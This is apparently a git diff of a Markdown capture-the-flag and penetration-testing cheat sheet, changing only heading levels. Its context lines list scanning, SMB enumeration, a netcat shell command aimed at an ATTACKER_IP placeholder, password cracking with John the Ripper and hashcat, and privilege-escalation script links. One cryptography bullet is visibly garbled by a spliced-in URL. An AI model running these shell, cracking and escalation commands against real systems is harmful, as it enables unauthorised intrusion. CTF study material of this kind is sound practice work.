@@ -18,7 +18,7 @@ toc: true
 toc_sticky: true
 ---
 
-# System Hacking
+## System Hacking
 * To discover the system in the network, use either Nmap or Netdiscover
 * To scan for vulnerabilities use nikto.
   * Command to run : `nikto -h <HOST_IP>`
@@ -113,8 +113,8 @@ toc_sticky: true
 * If SMB is open, we can use the following command to try connecting
   * `smbclient -L \\\\<HOST_IP>`
 
-# Web Hacking
-* 5 Stages of Hacking
+## Web Hacking
+## 5 Stages of Hacking
   * Reconnaissance
   * Scanning and Enumeration
   * Gaining Access
@@ -163,7 +163,7 @@ toc_sticky: true
 * Reverse Shell
 * Bind Shell : `nc <ATTACKER_IP> <ATTACKET_PORT>`, to listen : `nc -lvp <ATTACKER_PORT>`
 
-# File Hacking
+## File Hacking
 * If something is hidden on a pdf which we need to find, we can Press Ctrl + A to copy everything on the pdf and paste on notepad.
    * If nothing is found, we can use [Inkspace tool](https://inkscape.org) to paste the pdf and try to ungroup several times to extract any hidden flag.
    * We can even solve using pdf-uncompress tools like qpdf to convert compressed data to redeable format and solve from there.
@@ -176,14 +176,14 @@ toc_sticky: true
 * We can use ltrace to track all app + library calls.
   * Command: `ltrace ./<PROG_NAME>`
 
-# Cryptography
+## Cryptography
 * If there is word `caesar` in the question or hint, this can be a substitution cipher.
   * Use this website ww* This [site](https://www.guballa.de/vigenere-solver) is great at breaking Vigenère ciphers without knowing the key.
 * If you find `!` in the cipher text and cipher seems to be within certain range of Letters and appears to be transposition of a plain text, Use this website [Ceasar Box](https://www.dcode.fr/caesar-box-cipher)w.dcode.fr/caesar-cipher to Bruteforce the hidden message.
 * To solve One Time Pad : [OTP](http://rumkin.com/tools/cipher/otp.php)
 
 
-# Forensics
+## Forensics
 * If there is a image given, try `file` comamnd on the image to learn more information.
 * Binwalk to find data inside the image or sometimes if binwalk reports as zip Archive, we can rename the file to <FILE_NAME>.zip to find interesting data.
    * Command `binwalk <IMAGE_NAME>`
@@ -195,7 +195,7 @@ toc_sticky: true
 * GrepToWin : `strings <FILE_NAME> | grep flag{`
 * StegHide `steghide extract -sf <FILE_NAME>`
 
-# Password Cracking
+## Password Cracking
 * If there is `JOHN` in the title/text/hint, its mostly reference to `JOHN the ripper` for bruteforce passwords/hashes.
   * Command : `./john -show <PASS_FILE>`
   * Better Command : `john output.hash --wordlist=/usr/share/wordlists/rockyou.txt`
@@ -228,7 +228,7 @@ toc_sticky: true
   hashcat -m 500 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt --force
   ```
   
-# Privilige Escalation
+## Privilige Escalation
 * [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)
 * [Lin Enum Script](https://github.com/rebootuser/LinEnum)
 * [Unix Priv Check](https://github.com/pentestmonkey/unix-privesc-check)
@@ -296,7 +296,7 @@ toc_sticky: true
   Nov 19 00:05:01 sun CRON[5701]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
   ```
   
-# Tools
+## Tools
 * Reconnoitre [Links](https://github.com/codingo/Reconnoitre) -- A security tool for multithreaded information gathering and service enumeration whilst building directory structures to store results, along with writing out recommendations for further testing.
    * `reconnoitre -t 10.10.10.37 -o `pwd` --services`
 * Total Commander - multi purpose terminal for Hacking. Link : www.ghisler.com
